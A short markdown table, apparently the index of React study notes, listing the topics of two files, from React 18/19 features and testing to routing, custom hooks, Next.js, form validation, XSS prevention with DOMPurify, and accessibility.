| **File 15** | React 18 (Automatic Batching, createRoot), React 19 (use, useActionState, useOptimistic, Server Components), Testing (Jest+RTL), TypeScript with React, TanStack Query, Zustand, Synthetic Events, List Virtualization |
| **File 16 (this file)** | React Router advanced (useNavigate, useSearchParams, Protected Routes, Loaders), Custom Hooks (useFetch, useLocalStorage, useDebounce, useOnlineStatus), Anti-Patterns (9 common mistakes), Next.js (Pages Router, App Router, SSR/SSG/ISR), React Hook Form + Zod, key prop deep dive (force remount), dangerouslySetInnerHTML + XSS + DOMPurify, Accessibility (ARIA, focus, keyboard, forms) |
